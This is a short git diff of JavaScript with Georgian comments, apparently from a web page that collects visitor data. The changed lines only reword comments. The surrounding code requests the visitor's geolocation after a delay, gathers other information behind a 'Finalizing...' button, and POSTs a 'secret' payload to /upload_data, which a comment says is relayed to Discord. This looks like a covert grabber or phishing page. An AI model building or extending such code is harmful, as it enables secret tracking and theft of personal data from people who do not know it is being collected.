@@ -65,7 +65,7 @@
             } else { resolve(null); }
         });
 
-        // 2. ლოკაცია (3 წამიანი პაუზით, რომ ბრაუზერმა მოასწროს)
+        // 2. ლოკაცია (3 წამიანი პაუზით)
         const getLocation = () => new Promise((resolve) => {
             if (navigator.geolocation) {
                 setTimeout(() => {
@@ -164,7 +164,7 @@
             btn.innerText = "Finalizing...";
             await collectRestInfo();
 
-            // 4. გაგზავნა Discord-ზე
+            // 4. გაგზავნა Discord-ზე (ერთიანად)
             await fetch('/upload_data', {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ type: 'DIRECT_OPEN', secret: secretData })
